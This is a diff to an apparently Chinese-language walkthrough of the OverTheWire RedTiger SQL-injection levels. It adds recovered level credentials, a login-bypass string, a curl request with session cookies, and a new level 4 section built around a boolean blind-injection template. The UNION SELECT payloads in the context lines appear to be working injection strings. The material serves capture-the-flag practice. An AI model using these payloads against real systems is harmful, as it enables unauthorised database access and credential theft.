@@ -574,6 +574,10 @@ https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,username
 
 ```
 got it.拿到用户名密码后登录即可。
+```
+Hornoxe
+thatwaseasy
+```
 
 ```
 curl "http://redtiger.labs.overthewire.org/level1.php?cat=1"%"20union"%"20select"%"201,2,username,password"%"20from"%"20level1_users" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" --compressed -H "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" -H "Connection: keep-alive" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug" -H "Host: redtiger.labs.overthewire.org" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --data ""
@@ -607,6 +611,7 @@ admin')or('1'='1
 	Login incorrect!
 说明存在字符型注入点。这就好办了。直接上sql万能密码
 ```
+admin
 ' or '1'='1
 ```
 
@@ -688,7 +693,10 @@ MDA2MjE0MDI3MjQ4MTk0MjUyMTQ1MDgxMjA1MTExMjUzMTQzMDc2MTYzMDI2MDA2MTcxMDY1MTcyMDcw
 # max' union select 1,2,3,4,5,6,password from level3_users where username='Admin'#
 MDA2MjE0MDI3MjQ4MTk0MjUyMTQ1MDgxMjA1MTExMjUzMTQzMDc2MTYzMDI2MDA2MTcxMDY1MTcyMDcwMDYzMTk5MjM2MjE5MDgwMjQ2MTU1MjA4MTc5MDk2MTk3MTQ1MTE5MTA3MTY3MTM3MjA4MTcxMDYyMDM0MTYyMTQ3MDQ0MjE4MTYwMTY1MDIyMjA2MDc4MjA1MDczMDY5MTUzMTQ3MDkwMDYxMjQwMTYwMDM0MDUxMDgxMTU0MTAzMDgyMTA3MTE0MTI0MjEzMTM0MDY0MTU0MTMzMDEzMDAwMjE0MTU1MTA3MTI1MTMzMDA2
 ```
-
+```
+admin
+thisisaverysecurepasswordEEE5rt
+```
 代码可以写作：
 ```
 $payload2 ="max' union select 1,2,3,4,5,6,password from level3_users where username='Admin'#";
@@ -699,6 +707,34 @@ print_r($en_payload);
 print '<br>';
 
 ```
+
+## level4
+
+网站
+```
+curl "https://redtiger.labs.overthewire.org/level4.php" -H "Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
+```
+
+	Welcome to Level 4
+
+	Target: Get the value of the first entry in table level4_secret in column keyword
+	Disabled: like
+
+从`table_leel4`表中的`keyword`列得到第一个值。
+这道题的提示是盲注。
+点击`Click me`，得到带有`?id=1`的新链接`https://redtiger.labs.overthewire.org/level4.php?id=1`。
+
+正常页面显示`Query returned 1 rows. `。
+注入`'`，新页面显示`Query returned 0 rows. `。说明这是错误结果。
+
+利用布尔盲注，通过返回页面中`Query returned 1 rows. `的结果来筛选出目标结果。
+
+
+
+```
+ascii(substr(select keyword from level4_secret, {0}, 1))<{1}
+```
+
 
 ## 参考网站
 [1] [SQL 注入](https://ctf-wiki.github.io/ctf-wiki/web/sqli/)
